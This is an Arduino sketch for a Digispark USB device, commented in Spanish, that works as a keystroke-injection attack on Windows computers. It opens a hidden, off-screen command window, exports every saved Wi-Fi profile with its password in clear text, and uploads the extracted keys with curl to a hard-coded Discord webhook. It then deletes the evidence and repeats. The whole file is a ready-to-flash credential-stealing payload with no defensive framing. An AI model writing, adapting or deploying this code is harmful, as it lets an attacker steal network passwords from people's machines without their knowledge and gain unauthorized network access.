#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 //Return/Enter Key

void setup() {
  pinMode(1, OUTPUT); // LED on Model A 
  DigiKeyboard.delay(5000); // Espera inicial
}

void loop() {
  DigiKeyboard.update();

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Inicia Ejecutar
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); // Ventana de CMD pequeña
  DigiKeyboard.delay(500);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
  DigiKeyboard.sendKeyStroke(KEY_M); //goto Move
  for(int i =0; i < 100; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN);
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
  DigiKeyboard.delay(100);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cd %temp%"); // Cambia al directorio temporal
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("netsh wlan export profile key=clear"); // Exporta perfiles Wi-Fi
  DigiKeyboard.delay(500);  

  // Extraer contraseñas Wi-Fi y guardarlas en un archivo
  DigiKeyboard.println("findstr /s /i /c:\"keyMaterial\" Wi*.xml > Wi-Fi-PASS");

  // Enviar contenido del archivo a través de Discord webhook
  DigiKeyboard.println("curl -X POST -F \"file=@Wi-Fi-PASS\" https://discord.com/api/webhooks/1203436459881668700/cUHceAWnGXSkrTRgKKgRJQk4RqBYwz6ceuJo9h-3Bc1eyG2x2xjJgDaMchDW11HrKzQH");

  DigiKeyboard.delay(500);  
  DigiKeyboard.println("del Wi-* /s /f /q"); // Limpia archivos temporales
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("exit"); // Sale del CMD
  DigiKeyboard.delay(500);  
  digitalWrite(1, HIGH); // Enciende el LED cuando el programa termina
  DigiKeyboard.delay(90000); // Espera prolongada
  digitalWrite(1, LOW); // Apaga el LED
  DigiKeyboard.delay(5000);
}